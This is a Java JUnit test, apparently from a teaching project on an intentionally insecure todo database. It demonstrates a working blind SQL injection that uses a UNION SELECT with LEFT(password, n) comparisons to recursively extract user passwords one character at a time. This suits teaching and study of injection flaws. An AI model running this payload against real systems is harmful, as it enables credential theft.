package sqlinjection.insecuredb.blindsql;

import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import sqlinjection.insecuredb.DbApi;
import sqlinjection.tododb.MyDB;


import java.util.HashMap;
import java.util.List;
import java.util.Map;

class BlindSQLInjectionExampleTest {

    /* examples of what SQL Injection is capable of */

    static DbApi myDB;

    @BeforeAll
    static void setupDB(){
        myDB = new DbApi(new MyDB().create());
    }

    @Test
    void blindSqlToBruteForceGetPassword(){
        Map<String, String> usernamePasswords = bruteForceGuessPasswords("", 'A');

        for(Map.Entry<String,String>usernamePassword : usernamePasswords.entrySet()){
            System.out.println(String.format("Found: Username [%s] with Password [%s]", usernamePassword.getKey(), usernamePassword.getValue()));
        }

        Assertions.assertEquals(2, usernamePasswords.keySet().size(), "Expected to find 2 users");
    }

    /*

    The blind SQL Injection takes advantage of the fact that the output of SQL execution is different depending on the true/false nature of the query

    From this we can deduce information e.g. table names, user names, passwords, etc.

    Ths example uses the boolean Select i.e. does it return records or not to deduce passwords for users.

     */

    Map<String, String> bruteForceGuessPasswords(String passwordGuess, char nextChar){

        Map<String, String> usernamePasswords = new HashMap<>();

        char myNextChar = nextChar;

        while(myNextChar<='z') {

            String myPasswordGuess = passwordGuess + myNextChar;

            List<String> usernames = myDB.getTodosOfStatus("-1 UNION SELECT name FROM users WHERE LEFT(password, " + myPasswordGuess.length() + ")='" + myPasswordGuess + "'");
            if (usernames.size() > 0) {
                // found a user with matching password partial
                System.out.println(usernames + " - " + myPasswordGuess);

                // try and improve on that recursively
                Map<String, String> retMap = bruteForceGuessPasswords(myPasswordGuess, 'A');

                for(Map.Entry<String,String>usernamePassword : retMap.entrySet()){
                    if(usernames.contains(usernamePassword.getKey())){
                        // the one found during recursive is better
                        usernamePasswords.put(usernamePassword.getKey(), usernamePassword.getValue());
                        usernames.remove(usernamePassword.getKey());
                    }
                }
                // use any we found that did not appear in the recursive expansion
                for(String username : usernames){
                    usernamePasswords.put(username, myPasswordGuess);
                }
            }
            myNextChar+=1;
        }

        return usernamePasswords;
    }


}
